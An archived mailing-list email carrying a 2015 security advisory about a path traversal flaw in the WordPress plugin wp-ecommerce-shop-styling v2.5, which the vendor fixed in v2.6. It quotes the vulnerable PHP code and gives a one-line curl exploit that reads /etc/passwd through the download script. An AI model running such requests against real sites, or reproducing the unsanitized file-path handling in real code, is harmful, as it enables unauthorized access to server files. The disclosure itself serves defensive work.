X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1297" "Monday" "6" "July" "2015" "18:47:53" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<E25AF830-A96A-46F1-9463-235B02CBCCD6@me.com>" "34" "[oss-security] Remote file download vulnerability in wordpress plugin wp-ecommerce-shop-styling v2.5" nil nil nil "7" "2015070622:47:53" "[oss-security] Remote file download vulnerability in wordpress plugin wp-ecommerce-shop-styling v2.5" (number mark "U       larry0@me.co Jul  6   34/1297  " thread-indent "\"[oss-security] Remote file download vulnerability in wordpress plugin wp-ecommerce-shop-styling v2.5\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 17850 invoked by uid 550); 6 Jul 2015 22:48:12 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 17803 invoked from network); 6 Jul 2015 22:48:07 -0000
X-Proofpoint-Virus-Version: vendor=fsecure
 engine=2.50.10432:5.14.151,1.0.33,0.0.0000
 definitions=2015-07-06_10:2015-07-06,2015-07-06,1970-01-01 signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 suspectscore=0 phishscore=0 adultscore=0 bulkscore=0 classifier=spam adjust=0
 reason=mlx scancount=1 engine=7.0.1-1412110000 definitions=main-1507060335
From: "Larry W. Cashdollar" <larry0@me.com>
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
Date: Mon, 06 Jul 2015 18:47:53 -0400
Message-id: <E25AF830-A96A-46F1-9463-235B02CBCCD6@me.com>
Cc: fulldisclosure@seclists.org
To: Open Source Security <oss-security@lists.openwall.com>
MIME-version: 1.0 (Mac OS X Mail 8.2 \(2098\))
X-Mailer: Apple Mail (2.2098)
Subject: [oss-security] Remote file download vulnerability in wordpress plugin
 wp-ecommerce-shop-styling v2.5

Title: Remote file download vulnerability in wordpress plugin wp-ecommerce-=
shop-styling v2.5
Author: Larry W. Cashdollar, @_larry0
Date: 2015-07-05
Download Site: https://wordpress.org/plugins/wp-ecommerce-shop-styling
Vendor: https://profiles.wordpress.org/haet/
Vendor Notified: 2015-07-05, fixed in version 2.6.
Vendor Contact: http://wpshopstyling.com
Description: Customize your WP ecommerce store with HTML mail templates, me=
ssage content, transaction results and PDF invoices with WYSIWYG editor and=
 placeholders.
Vulnerability:
The code in ./wp-ecommerce-shop-styling/includes/download.php doesn't sanit=
ize user input to prevent sensitive system files from being downloaded.


1 <?php
2 require_once("../../../../wp-admin/admin.php");
3=20
4 header('Content-disposition: attachment; filename=3D'.$_GET['filename']);
5 header('Content-type: application/pdf');
6 readfile(HAET_INVOICE_PATH.$_GET['filename']);
7 ?>

You'll have to rename the download file via mv -- -..-..-..-..-..-..-..-..-=
etc-passwd passwd as the filename is set to the download filename with path.

CVEID: Requested TBD=09
OSVDB: TBD

Exploit Code:
	=E2=80=A2 $ curl http://www.example.com/wp-content/plugins/wp-ecommerce-sh=
op-styling/includes/download.php?filename=3D../../../../../../../../../etc/=
passwd=
